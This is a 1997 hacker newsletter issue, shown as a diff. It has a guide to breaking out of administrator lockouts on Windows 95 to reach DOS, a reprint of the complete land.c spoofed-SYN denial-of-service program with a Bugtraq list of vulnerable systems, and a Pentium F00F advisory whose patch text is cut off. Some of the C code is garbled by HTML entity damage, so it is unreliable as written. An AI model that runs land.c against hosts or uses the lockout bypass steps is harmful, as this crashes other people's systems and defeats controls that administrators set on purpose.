@@ -1,0 +1,847 @@
+                __ __                      __ __         __          
+               / // /__ ____  ___  __ __  / // /__ _____/ /_____ ____
+              / _  / _ `/ _ \/ _ \/ // / / _  / _ `/ __/  '_/ -_) __/
+             /_//_/\_,_/ .__/ .__/\_, / /_//_/\_,_/\__/_/\_\\__/_/   
+                      /_/  /_/   /___/                               
+                               ___  _              __ 
+                              / _ \(_)__ ____ ___ / /_
+                             / // / / _ `/ -_|_- / __/
+                            /____/_/\_, /\__/___/\__/ 
+                                   /___/			December 15, 1997
+
+========================================================================
+See our all-new Web site with all the Guides to (mostly) Harmless Hacking,
+Happy Hacker Digests and a sneak preview of the Happy Hacker book, coming to
+a bookstore near you in Feb. 1998. That is, unless they are too chicken to
+sell the book that will lead to the collapse of Civilization as We Know It.
+http://cmeinel.com/happyhacker.html.
+========================================================================
+You can now download "External Threats To Computer Security in Networked
+Systems" by Editor-In-Chief R.J. Gosselin from the bookstore at
+infowar.com.  You will especially enjoy the step by step hacking discussion
+dealing with the Charlotte Medical Center. Great Stuff !!
+==========================================================================
+Table of Contents:
+ 
+  * Hacking into DOS through Windows 95 by Cryptotek
+  * Land attacks bring Internet to its knees -- 
+		OK, OK, it at least gave it the sniffles
+  * Pentium Go F00F! 
+
+========================================================================
+	Hacking into DOS through Windows 95
+	By Cryptotek, written by Daniel Gilkerson
+========================================================================
+
+Here's how to hack into DOS when it has been locked out on a Windows 95
+system.  But before you proceed, remember -- I am not responsible for how
+you use this information. If you are on a LAN that has locked you out from
+using DOS, the systems administrator undoubtedly has a good reason for it.
+So, ideally, you will use this information to help make a LAN with Windows
+95 boxes on it more secure -- or maybe even to persuade management or your
+school to upgrade to Windows NT.
+
+Why are we trying to get into DOS, anyhow? The reason is that on a Windows
+95 or below system, if you can run DOS, you can evade any restrictions
+whatsoever that have been placed on that computer.
+
+First you have to know that command.com is the file that runs DOS.  Now the
+most common way to get in is just to click the ms-dos icon in your start
+menu.  However, oftentimes a computer may have been set up to make it hard
+to access DOS. So if you can't get to DOS from the start menu, here are some
+other methods.  
+
+1.	Lets say you can get into windows.  First try clicking on start, then
+run.  Type in command.com and then OK.  That's nothing big, but if it works,
+remember KISS (keep it simple stupid)
+
+2.	Another way is to browse for command.com in the C:\ directory using my
+computer, file manager, explorer, Internet explorer, etc.
+  
+3.	Let's say windows doesn't have a file run line.  Here our some ways to
+get one.  
+	a) Click on my computer, then windows, then winfile.exe.  This is file
+manager.  Under the File menu there's a run command.  
+	b) If MS Office is on the system, that's even better.  Run one of the
+Office programs and go to help.  Then about the program (the very last
+option on the menu)  It will bring up a window, click on the button that
+says system info.  For MS Office 97 you will get an explorer like window.
+Under the file menu there is a run command also.  For older versions of
+Office you will see a button that says run.  
+	c) Another way is to hit ctrl+esc or the windows hot key (if you have one)
+at the login screen before you enter windows.  This will bring up a task
+window.  Go to File and run and there you go. 
+
+4.	Reboot the system and hit F8.  If the boot keys haven't been disabled,
+now you get a menu with some options.  One should be command prompt only or
+safe mode command prompt only in safe mode.  Those 2 options should get you
+into DOS.  You might even have an option that will allow you to boot to
+previous DOS prompt.  That's even better.  
+
+5.	Now to add a little more security.  Lets say you have to enter a password
+to get into windows.  Well, Windows 95 password alone is easy to break
+through.  Just close the window (alt + F4, click on the X, or click cancel).
+What else is bad about the password prompt is, if you enter a different user
+name with a  password, it will automatically think you're a new user and
+tell you to enter your password again. There are other ways of getting in
+windows -- those are just few.  Now try some ways to get into DOS
+
+6.	Another example is using Windows 95 on a Windows NT Server.  The security
+is a little more advanced.  You can't close the login screen, which means
+you have to log on. The passwords are stored on the server machine, which
+makes it even harder.  But we won't let that stop us! 
+	a) First try getting a task window by hitting ctrl+Esc.  I've already
+explained above (in 3 c) how this brings up the run command from which you
+can type in command.com to get into DOS. However, another fun thing to do is
+try typing in control.exe.  This may get you into windows without logging
+on.  
+	b) If the system administrator is running policy editor, he or she can lock
+out certain programs.  This means if you log on to the machine, you probably
+won't be able to run DOS.  However, if you get into windows using the
+technique in 6 a,  policy editor will not be on because you are not logged
+on!  	
+	c) Sometimes the administrator can disable certain keys on the keyboard. If
+you want to enable them back, run windows.  You need to get into control
+panel.  But if policy editor is running you can't get to control panel.  So
+how do we get into the keyboard properties?  Go to start, and click on help.
+Type in the word "keyboard" and pick an option that you would think would be
+a property for the keyboard.  The help window will have a shortcut button to
+click on to get to the keyboard properties.  Click on it.  If they remapped
+the keyboard then there will be a remap tab. That is where you can change
+your keys.  
+	d) Another way you can change the properties is by getting into safe mode.
+  
+7.	In windows you can open notepad.  Open c:\msdos.sys.  This is what the
+file looks like:
+
+[Paths]
+WinDir=C:\WINDOWS
+WinBootDir=C:\WINDOWS
+HostWinBootDrv=C
+
+[Options]
+BootMulti=1
+BootGUI=1
+bootkeys=0
+bootWin = 0
+Network=1
+;
+;The following lines are required for compatibility with other programs.
+;Do not remove them (MSDOS.SYS needs to be greater than 1024 bytes).
+;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxa
+;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb
+;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxc
+;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxd
+;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe
+;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxf
+;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxg
+;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxh
+;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxi
+;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxj
+;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxk
+;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxl
+;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxm
+;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxn
+;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxo
+;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxp
+;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxq
+;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxr
+;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxs
+
+The bootGUI line is the graphical user interface.  1 means true and 0 means
+false.  To enable the boot keys, set this value to 0, save the file, and
+reboot.  When windows starts it will kick you into DOS.  If the line
+"bootkeys" is in this file, if it is set to 0 you won't be able to enter any
+keys on boot up.  Which means F8 is disabled.  Change the value to 1 or take
+out the line and you'll get the keys back.
+
+8.  Open autoexec.bat and place command.com (preferable at the end) in it.
+Reboot.
+
+9.  And the last but not least way to hack into DOS is to use a Boot disk.
+
+I'd like to give thanks to the following people for their help.
+
+James Orlando and Alfred Guzman VI for some of the methods and testing these
+methods
+
+Billy Emfinger, Joseph, Mahad and Pablo for some of the methods
+
+And last but not least
+
+Carolyn  Meinel for her information on windows hacking
+
+=======================================================================
+  ***	Land Attack Gives Internet the Sniffles
+=======================================================================
+by Carolyn Meinel
+
+Read it! Read it! Read all about it! The infamous Land.c program, released
+on the Bugtraq mailing list Nov. 20, 1997, has ever since had the Internet
+sitting with its feet in a tub of hot water and an ice pack on its head.
+Forgot to respond to someone's email? Tell him you never got it on account
+of Land.c. Your web site is down because you got behind on payments? Tell
+people Land.c is blocking it! Land.c is the best thing since dog ate my
+homework!
+
+Seriously, the Land.c program has caused one heck of a bunch of trouble. It
+launches denial of service attacks against computers using TCP (transfer
+control protocol, used on the Internet) SYN packets (which tell a computer
+to prepare to connect to another computer) which trick the host computer
+into attempting to connect to itself. This makes many computers fail to make
+other TCP connections for about 30 seconds after each phony SYN packet
+arrives. 
+
+To put it simply, if some 31337 haxor sends a phony SYN packet to your
+computer every 30 seconds, your computer is cut off from the Internet.
+
+The Bugtraq list released the code to this attack, "land.c" in order to
+enable the many security experts who read it to devise ways to thwart it.
+But someone wrote a program to automate this attack against thousands of
+machines simultaneously and released it to other vandals, causing major
+problems. At times the Internet Weather Report (http://internetweather.com)
+was reporting several Internet backbone providers at a time suffering from
+packet losses of over 30%. How much of that was from land attack is unclear,
+however.
+
+Following is the original report of the land.c code, and the final Bugtraq
+report summarizing vulnerabilities and locations of fix information. To
+subscribe to Bugtraq, email LISTSERV@NETSPACE.ORG with message "subscribe
+bugtraq." Archives are at http://www.netspace.org/lsv-archive/bugtraq.html.
+
+Approved-By: aleph1@UNDERGROUND.ORG
+Date: 	Thu, 20 Nov 1997 19:40:19 -0500
+Reply-To: m3lt 
+Sender: Bugtraq List 
+From: m3lt 
+Subject:      new TCP/IP bug in win95
+X-cc:         
+To: BUGTRAQ@NETSPACE.ORG
+
+hi,
+
+        I recently discovered a bug which freezes win95 boxes.  here's how
+it works: send a spoofed packet with the SYN flag set from a host, on an
+open port (such as 113 or 139), setting as source the SAME host and port
+(ie: 10.0.0.1:139 to 10.0.0.1:139).  this will cause the win95 machine to
+lock up.
+
+        The piece of code included in this message does that, so...  have fun!
+
+        I haven't tested this bug on other platforms, I don't have the
+resources.  Please feel free to do so.
+
+m3lt
+meltman@lagged.net
+
+--- snip snip -----------------------------------------------------------
+
+/* land.c by m3lt, FLC
+   crashes a win95 box */
+
+#include <stdio.h>#include <netdb.h>#include <arpa/inet.h>#include <netinet/in.h>#include <sys/types.h>#include <sys/socket.h>#include <netinet/ip.h>#include <netinet/ip_tcp.h>#include <netinet/protocols.h>
+struct pseudohdr
+{
+        struct in_addr saddr;
+        struct in_addr daddr;
+        u_char zero;
+        u_char protocol;
+        u_short length;
+        struct tcphdr tcpheader;
+};
+
+u_short checksum(u_short * data,u_short length)
+{
+        register long value;
+        u_short i;
+
+        for(i=0;i<(length&gt>1);i++)
+                value+=data[i];
+
+        if((length&1)==1)
+                value+=(data[i]&lt<8);
+
+        value=(value&65535)+(value&gt>16);
+
+        return(~value);
+}
+
+int main(int argc,char * * argv)
+{
+        struct sockaddr_in sin;
+        struct hostent * hoste;
+        int sock;
+        char buffer[40];
+        struct iphdr * ipheader=(struct iphdr *) buffer;
+        struct tcphdr * tcpheader=(struct tcphdr *) (buffer+sizeof(struct
+iphdr));
+        struct pseudohdr pseudoheader;
+
+        fprintf(stderr,"land.c by m3lt, FLC\n");
+
+        if(argc<3)
+        {
+                fprintf(stderr,"usage: %s IP port\n",argv[0]);
+                return(-1);
+        }
+
+        bzero(&sin,sizeof(struct sockaddr_in));
+        sin.sin_family=AF_INET;
+
+        if((hoste=gethostbyname(argv[1]))!=NULL)
+                bcopy(hoste->h_addr,&sin.sin_addr,hoste->h_length);
+        else if((sin.sin_addr.s_addr=inet_addr(argv[1]))==-1)
+        {
+                fprintf(stderr,"unknown host %s\n",argv[1]);
+                return(-1);
+        }
+
+        if((sin.sin_port=htons(atoi(argv[2])))==0)
+        {
+                fprintf(stderr,"unknown port %s\n",argv[2]);
+                return(-1);
+        }
+
+        if((sock=socket(AF_INET,SOCK_RAW,255))==-1)
+        {
+                fprintf(stderr,"couldn't allocate raw socket\n");
+                return(-1);
+        }
+
+        bzero(&buffer,sizeof(struct iphdr)+sizeof(struct tcphdr));
+        ipheader->version=4;
+        ipheader->ihl=sizeof(struct iphdr)/4;
+        ipheader->tot_len=htons(sizeof(struct iphdr)+sizeof(struct tcphdr));
+        ipheader->id=htons(0xF1C);
+        ipheader->ttl=255;
+        ipheader->protocol=IP_TCP;
+        ipheader->saddr=sin.sin_addr.s_addr;
+        ipheader->daddr=sin.sin_addr.s_addr;
+
+        tcpheader->th_sport=sin.sin_port;
+        tcpheader->th_dport=sin.sin_port;
+        tcpheader->th_seq=htonl(0xF1C);
+        tcpheader->th_flags=TH_SYN;
+        tcpheader->th_off=sizeof(struct tcphdr)/4;
+        tcpheader->th_win=htons(2048);
+
+        bzero(&pseudoheader,12+sizeof(struct tcphdr));
+        pseudoheader.saddr.s_addr=sin.sin_addr.s_addr;
+        pseudoheader.daddr.s_addr=sin.sin_addr.s_addr;
+        pseudoheader.protocol=6;
+        pseudoheader.length=htons(sizeof(struct tcphdr));
+        bcopy((char *) tcpheader,(char *)
+&pseudoheader.tcpheader,sizeof(struct tcphdr));
+        tcpheader->th_sum=checksum((u_short *)
+&pseudoheader,12+sizeof(struct tcphdr));
+
+        if(sendto(sock,buffer,sizeof(struct iphdr)+sizeof(struct
+tcphdr),0,(struct sockaddr *) &sin,sizeof(struct sockaddr_in))==-1)
+        {
+                fprintf(stderr,"couldn't send packet\n");
+                return(-1);
+        }
+
+        fprintf(stderr,"%s:%s landed\n",argv[1],argv[2]);
+
+        close(sock);
+        return(0);
+}
+
+
+Date: 	Mon, 24 Nov 1997 23:53:16 -0600
+Reply-To: Aleph One 
+Sender: Bugtraq List 
+From: Aleph One 
+Subject:      Re: "LAND" Attack Update
+To: BUGTRAQ@NETSPACE.ORG
+
+This is the last "LAND" update. I will not post any more. This list is not
+meant to be comprehensive nor accurate. For an accurate assestment of the
+risk to your IP stack contact your vendor.
+
+Cisco Field Notice: TCP Loopback Denial-of-Service Attack and Cisco Devices
+http://www.cisco.com/warp/public/770/land-pub.shtml
+
+Read "Network Ingress Filtering: Defeating Denial of Service Address Spoofing"
+ftp://ietf.org/internet-drafts/draft-ferguson-ingress-filtering-03.txt
+
+The survey says:
+
+AIX 3                                   IS  vulnerable
+AIX 3.2                                 NOT vulnerable
+AIX 4                                   NOT vulnerable
+AIX 4.1                                 NOT vulnerable
+AIX 4.2.1                               NOT vulnerable
+AmigaOS AmiTCP 4.0demo                  NOT vulnerable
+AmigaOS AmiTCP 4.2 (Kickstart 3.0)      IS  vulnerable
+AmigaOS Miami 2.0                       NOT vulnerable
+AmigaOS Miami 2.1f                      NOT vulnerable
+AmigaOS Miami 2.1p                      NOT vulnerable
+AmigaOS Miami 2.92c                     NOT vulnerable
+BeOS Preview Release 2 PowerMac         IS  vulnerable
+BSDI 2.0                                IS  vulnerable
+BSDI 2.1 (vanilla)                      IS  vulnerable
+BSDI 2.1 (K210-021,K210-022,K210-024)   NOT vulnerable
+BSDI 3.0                                NOT vulnerable
+DG/UX R4.12                             NOT vulnerable
+Digital UNIX 3.2c                       NOT vulnerable
+Digital UNIX 4.0                        NOT vulnerable
+Digital VMS ???                         IS  vulnerable
+FreeBSD 2.1.6-RELEASE                   NOT vulnerable
+FreeBSD 2.2.2-RELEASE                   NOT vulnerable
+FreeBSD 2.2.5-RELEASE                   IS  vulnerable
+FreeBSD 2.2.5-STABLE                    IS  vulnerable (fixed)
+FreeBSD 3.0-CURRENT                     IS  vulnerable (fixed)
+HP External JetDirect Print Servers     IS  vulnerable
+HP-UX 9.03                              NOT vulnerable
+HP-UX 10.01                             NOT vulnerable
+HP-UX 10.20                             NOT vulnerable
+IBM AS/400 OS7400 3.7                   IS  vulnerable (100% CPU)
+IRIX 5.2                                IS  vulnerable
+IRIX 5.3                                IS  vulnerable
+IRIX 6.2                                NOT vulnerable
+IRIX 6.3                                NOT vulnerable
+IRIX 6.4                                NOT vulnerable
+Linux 1.2.13                            NOT vulnerable
+Linux 2.1.65                            NOT vulnerable
+Linux 2.0.30                            NOT vulnerable
+Linux 2.0.32                            NOT vulnerable
+MacOS MacTCP                            IS  vulnerable
+MacOS OpenTransport 1.1.1               NOT vulnerable
+MacOS 7.1p6                             NOT vulnerable
+MacOS 7.5.1                             NOT vulnerable
+MacOS 7.6.1 OpenTransport 1.1.2         IS  vulnerable (not a compleate
+lockup)
+MacOS 8.0                               IS  vulnerable (TCP/IP stack crashed)
+MVS OS390 1.3                           NOT vulnerable
+NetApp NFS server 4.1d                  IS  vulnerable
+NetApp NFS server 4.3                   IS  vulnerable
+NetBSD 1.1                              IS  vulnerable
+NetBSD 1.2                              IS  vulnerable
+NetBSD 1.2a                             IS  vulnerable
+NetBSD 1.2.1                            IS  vulnerable (fixed)
+NetBSD 1.3_ALPHA                        IS  vulnerable (fixed)
+NeXTSTEP 3.0                            IS  vulnerable
+NeXTSTEp 3.1                            IS  vulnerable
+Novell 4.11                             IS  vulnerable (100% CPU for 30 secs)
+OpenBSD 2.1                             (conflicting reports)
+OpenBSD 2.2                             NOT vulnerable
+OpenVMS 7.1 with UCX 4.1-7              IS  vulnerable
+OS/2 3.0                                NOT vulnerable
+OS/2 4.0                                NOT vulnerable
+QNX 4.24                                IS  vulnerable
+Rhapsody Developer Release              IS  vulnerable
+SCO OpenServer 5.0.2 SMP                IS  vulnerable
+SCO OpenServer 5.0.4                    IS  vulnerable (kills networking)
+SCO Unixware 2.1.1                      IS  vulnerable
+SCO Unixware 2.1.2                      IS  vulnerable
+Salaris 2.4                             NOT vulnerable
+Solaris 2.5.1                           NOT vulnerable
+Solaris 2.5.2                           NOT vulnerable
+Solaris 2.6                             NOT vulnerable
+SunOS 4.1.3                             IS  vulnerable
+SunOS 4.1.4                             IS  vulnerable
+Ultrix ???                              NOT vulnerable
+Windows 95 (vanilla)                    IS  vulnerable
+Windows 95 + Winsock 2 + VIPUPD.EXE     IS  vulnerable
+Windows NT (vanilla)                    IS  vulnerable
+Windows NT + SP3                        IS  vulnerable
+Windows NT + SP3 + simptcp-fix          IS  vulnerable
+
+Some misc stuff:
+
+3Com Accessbuilder 600/700              NOT vulnerable
+3Com LinkSwitch 1000                    NOT vulnerable
+3Com OfficeConnect 500                  NOT vulnerable
+3Com SuperStack II Switch 1000          IS  vulnerable
+Adtran TSU Rack                         NOT vulnerable
+Apple LaserWriter                       IS  vulnerable
+Ascend 4000 5.0Ap20                     NOT vulnerable
+Ascend Pipeline 50 rev 5.0Ai16          NOT vulnerable
+Ascend Pipeline 50 rev 5.0Ap13          NOT vulnerable
+BayNetworks MARLIN 1000 OS (0).3.024(R) NOT vulnerable
+BinTec BIANCA/BRICK-XS 4.6.1 router     IS  vulnerable
+Cisco Classic IOS <10.3, early 10.3, 11.0, 11.1, and 11.2 IS vulnerable
+Cisco IOS/700                           IS  vulnerable
+Cisco Catalyst                          IS  vulnerable
+Digital VT1200                          IS  vulnerable
+Farallon Netopia PN440                  NOT vulnerable
+HP Envizex Terminal                     IS  vulnerable
+LaserJet Printer                        NOT vulnerable
+Livingston Office Router (ISDN)         IS  vulnerable
+Livingston PM ComOS 3.3.3               NOT vulnerable
+Livingston PM ComOS 3.5b17 + 3.7.2      NOT vulnerable
+Livingston PM ComOS 3.7L                NOT vulnerable
+Livingston PM ComOS 3.7.2               NOT vulnerable
+Livingston Enterprise PM 3.4 2L         NOT vulnerable
+Livingston T1/E1 OR                     IS  vulnerable
+Milkyway Blackhole Firewall 3.0 (SunOS) IS  vulnerable
+Milkyway Blackhole Firewall 3.02(SunOS) IS  vulnerable
+NCD X Terminals, NCDWare v3.1.0         IS  vulnerable
+NCD X Terminals, NCDWare v3.2.1         IS  vulnerable
+Netopia PN440 v2.0.1                    IS  vulnerable
+Proteon GT60                            NOT vulnerable
+Proteon GT60Secure                      NOT vulnerable
+Proteon GT70                            NOT vulnerable
+Proteon GT70Secure                      NOT vulnerable
+Proteon GTAM                            NOT vulnerable
+Proteon GTX250                          NOT vulnerable
+Proteon RBX250                          NOT vulnerable
+Sonix Arpeggio                          NOT vulnerable
+Sonix Arpeggio +                        NOT vulnerable
+Sonix Arpeggio Lite                     NOT vulnerable
+
+Aleph One / aleph1@dfw.net
+http://underground.org/
+KeyID 1024/948FD6B5
+Fingerprint EE C9 E8 AA CB AF 09 61  8C 39 EA 47 A8 6A B8 01
+
+=======================================================================
+  *** Pentium Go F00F!
+=======================================================================
+by Carolyn Meinel
+
+	As if the land attack wasn't enough, we've also been under siege from a
+weird little bug inside the Pentium chip. It's called the F0 0F bug because
+instruction that begin with "F0 0F" (that's hexadecimal numbers: A=10, B=11,
+F=15 etc.)  makes it roll over and play dead. Because this is a bug of the
+chip itself, no matter what operating system your Pentium box runs, you are
+vulnerable to this bug -- a bug certain computer vandals like to exploit. So
+if you want to be safe, either fix your chip or patch your operating system
+to prevent that instruction from getting passed to your chip. Details
+follow, again from Bugtraq. Remember, if you are serious about computer
+security, you must subscribe to Bugtraq!
+
+Date: 	Sat, 8 Nov 1997 19:16:24 -0600
+Reply-To: Aleph One 
+Sender: Bugtraq List    
+From: Aleph One 
+Subject:      Re: Intel Pentium Bug
+To: BUGTRAQ@NETSPACE.ORG
+
+I'll summarise most of the post on the queue. There are quite a few of
+them and the mostly containt the same information. This should save some
+time in light of the high volume generated by this thread.
+
+Jeff Odom, Tyson B., Alan Cox, David Bristow, and John Dowdal point out
+that on most modern motherboards you have to physically set or remove a
+jumper on the motherboard in order to upgrade the flash BIOS.
+Unfortunately, most people don't bother to go back and re-set the jumper
+to write-protect.
+
+It was also pointed out that it would be a feature if modern operating
+systems refuses to boot with the write-protect jumper turned off or at
+least print a warning message.
+
+Marc Newman, Thom Henderson, Edward S. Marshall, Trevor Schroeder
+inform us that of the the 6502, 6802, 68c02 or Z80 had an
+undocumented test instruction intended to test the data bus that
+would cause it to start incrementing the address bus at full speed. The
+result was a lockup. The opcode was dubbed HCF (Halt and Catch Fire)..
+
+Jonathan A. Davis also recalls that it was also possible, on Commodore
+"Pet" and "SP" machines, to drive the system's CIA (Complex Interface
+Adapter) chips into a hardware race, burning each other out. It cost him
+around $150/US to test it.
+
+Sylvan W. Clebsch provides some more information on the Commodore 1542
+disk drive. It seems he 1542 simply had no head stop. You could
+tell it to go seek track 0xFF, for example, and watch the head slide
+right off and ka-boom. This was a common attack on early C-64 based
+BBS's. Quite a few of them responded to a ctrl-D, CR-LF, ctrl-C combo
+by dropping out of the BBS into that goofy C-64 command interpreter.
+From there, the attacker would tell each 1542 on the machine (often
+quite a few on those BBS's) to seek off the edge.
+
+He also corrects us on the proper meaning of the "Singing Disk Drive".
+The amiga's 3.5" floppy could be made to produce an amazing variety of
+tones, and the result was a number of concertos and fun songs that were
+distributed in the form of programs that would screw with your floppy
+drive. The result was that the motor would burn out before too long,
+but a friend of his whose hardware was provided by the company he
+worked for wasted a lot of time "composing" for the floppy drive
+around 1986.
+
+Joe Ilacqua notes that he belives the flawed SPARC chips where from the
+1992 era, and could be halted in user/non-supervisor mode. As I he recalls
+it, for speed they often didn't do op-code verification or test for
+"impossible" combinations.  The assumption was that since all code would
+be generated by compilers you could guaranty the code would be "good".
+
+Casper Dik points out that "crashme" is designed to detect operating
+system bugs, not processor bugs. It just happens that it may find some.
+
+Aleph One / aleph1@dfw.net
+http://underground.org/
+KeyID 1024/948FD6B5
+Fingerprint EE C9 E8 AA CB AF 09 61  8C 39 EA 47 A8 6A B8 01
+
+
+From: Aleph One 
+Subject:      FreeBSD Security Advisory: FreeBSD-SA-97:06.F0 0F
+To: BUGTRAQ@NETSPACE.ORG
+
+-----BEGIN PGP SIGNED MESSAGE-----
+
+=============================================================================
+FreeBSD-SA-97:06                                            Security Advisory
+                                                                FreeBSD, Inc.
+
+Topic:          Pentium processors have flaw allowing unpriviledged crashes
+
+Category:       core
+Module:         kern
+Announced:      1997-12-09
+Affects:        FreeBSD 2.1.*, FreeBSD 2.2.*,
+                FreeBSD-stable and FreeBSD-current
+Corrected:      FreeBSD-current as of 1997-12-04
+                FreeBSD-stable as of 1997-12-04
+FreeBSD only:   no
+
+Patches:        ftp://freebsd.org/pub/CERT/patches/SA-97:06/
+
+=============================================================================
+
+I.   Background
+
+     Intel processors have instruction combinations that, when
+     executed, produce illegal instruction traps.  This is a normal
+     part of every cpu manufactured and is how new instructions are
+     generally emulated on older hardware.
+
+II.  Problem Description
+
+     A specific sequence of instructions, starting with the byte codes
+     F0 0F (hex) cause Pentium processors to lock up.  This lockup
+     wedges the entire system, requiring a hard reset to correct.
+     Systems that allow users to run arbitrary code are vulnerable to
+     this attack.
+
+III. Impact
+
+     An unpriviledged user can crash your system.
+
+IV.  Workaround
+
+     None is available.
+
+V.   Solution
+
+     The following patch corrects the problem for FreeBSD-current
+     systems before 1997-12-04, for FreeBSD 2.2-stable before
+     1997-12-04 and for FreeBSD 2.2.5.
+
+     We urge users of FreeBSD 2.1.* to upgrade to the more stable and
+     more powerfull FreeBSD 2.2.5 release.
+
+
+     Index: identcpu.c
+     ===================================================================
+     RCS file: /home/cvsup/freebsd/CVS/src/sys/i386/i386/identcpu.c,v
+     retrieving revision 1.33
+     retrieving revision 1.35
+     diff -u -r1.33 -r1.35
+     --- identcpu.c     1997/11/07 08:52:27     1.33
+     +++ identcpu.c     1997/12/04 14:35:38     1.35
+     @@ -107,6 +107,10 @@
+        );
+      }
+
+     +#if defined(I586_CPU) && !defined(NO_F00F_HACK)
+     +int has_F0 0F_bug = 0;
+     +#endif
+     +
+      void
+      printcpuinfo(void)
+      {
+     @@ -136,6 +140,14 @@
+                                break;
+                        case 0x500:
+                                strcat(cpu_model, "Pentium"); /* nb no
+space */
+     +#if defined(I586_CPU) && !defined(NO_F00F_HACK)
+     +                          /*
+     +                           * XXX - If/when Intel fixes the bug, this
+     +                           * should also check the version of the
+     +                           * CPU, not just that it's a Pentium.
+     +                           */
+     +                          has_F0 0F_bug = 1;
+     +#endif
+                                break;
+                        case 0x600:
+                                strcat(cpu_model, "Pentium Pro");
+     Index: machdep.c
+     ===================================================================
+     RCS file: /home/cvsup/freebsd/CVS/src/sys/i386/i386/machdep.c,v
+     retrieving revision 1.274
+     retrieving revision 1.278
+     diff -u -r1.274 -r1.278
+     --- machdep.c      1997/11/24 18:35:11     1.274
+     +++ machdep.c      1997/12/04 21:21:24     1.278
+     @@ -866,6 +867,11 @@
+      #endif /* VM86 */
+      #endif
+
+     +#if defined(I586_CPU) && !defined(NO_F00F_HACK)
+     +struct gate_descriptor *t_idt;
+     +extern int has_F0 0F_bug;
+     +#endif
+     +
+      static struct i386tss dblfault_tss;
+      static char dblfault_stack[PAGE_SIZE];
+
+     @@ -1533,6 +1539,40 @@
+        proc0.p_addr->u_pcb.pcb_mpnest = 1;
+        proc0.p_addr->u_pcb.pcb_ext = 0;
+      }
+     +
+     +#if defined(I586_CPU) && !defined(NO_F00F_HACK)
+     +void F0 0F_hack(void);
+     +SYSINIT(F0 0F_hack, SI_SUB_INTRINSIC, SI_ORDER_FIRST, F0 0F_hack, NULL);
+     +
+     +void
+     +F0 0F_hack(void) {
+     +  struct region_descriptor r_idt;
+     +  unsigned char *tmp;
+     +  int i;
+     +
+     +  if (!has_F0 0F_bug)
+     +          return;
+     +
+     +  printf("Intel Pentium F00F detected, installing workaround\n");
+     +
+     +  r_idt.rd_limit = sizeof(idt) - 1;
+     +
+     +  tmp = kmem_alloc(kernel_map, PAGE_SIZE * 2);
+     +  if (tmp == 0)
+     +          panic("kmem_alloc returned 0");
+     +  if (((unsigned int)tmp & (PAGE_SIZE-1)) != 0)
+     +          panic("kmem_alloc returned non-page-aligned memory");
+     +  /* Put the first seven entries in the lower page */
+     +  t_idt = (struct gate_descriptor*)(tmp + PAGE_SIZE - (7*8));
+     +  bcopy(idt, t_idt, sizeof(idt));
+     +  r_idt.rd_base = (int)t_idt;
+     +  lidt(&r_idt);
+     +  if (vm_map_protect(kernel_map, tmp, tmp + PAGE_SIZE,
+     +                     VM_PROT_READ, FALSE) != KERN_SUCCESS)
+     +          panic("vm_map_protect failed");
+     +  return;
+     +}
+     +#endif /* defined(I586_CPU) && !NO_F00F_HACK */
+
+      int
+      ptrace_set_pc(p, addr)
+     Index: trap.c
+     ===================================================================
+     RCS file: /home/cvsup/freebsd/CVS/src/sys/i386/i386/trap.c,v
+     retrieving revision 1.115
+     retrieving revision 1.118
+     diff -u -r1.115 -r1.118
+     --- trap.c 1997/11/24 13:25:37     1.115
+     +++ trap.c 1997/12/04 21:21:26     1.118
+     @@ -142,6 +143,11 @@
+      static void userret __P((struct proc *p, struct trapframe *frame,
+                         u_quad_t oticks));
+
+     +#if defined(I586_CPU) && !defined(NO_F00F_HACK)
+     +extern struct gate_descriptor *t_idt;
+     +extern int has_F0 0F_bug;
+     +#endif
+     +
+      static inline void
+      userret(p, frame, oticks)
+        struct proc *p;
+     @@ -211,6 +217,9 @@
+        u_long eva;
+      #endif
+
+     +#if defined(I586_CPU) && !defined(NO_F00F_HACK)
+     +restart:
+     +#endif
+        type = frame.tf_trapno;
+        code = frame.tf_err;
+
+     @@ -276,6 +285,10 @@
+                        i = trap_pfault(&frame, TRUE);
+                        if (i == -1)
+                                return;
+     +#if defined(I586_CPU) && !defined(NO_F00F_HACK)
+     +                  if (i == -2)
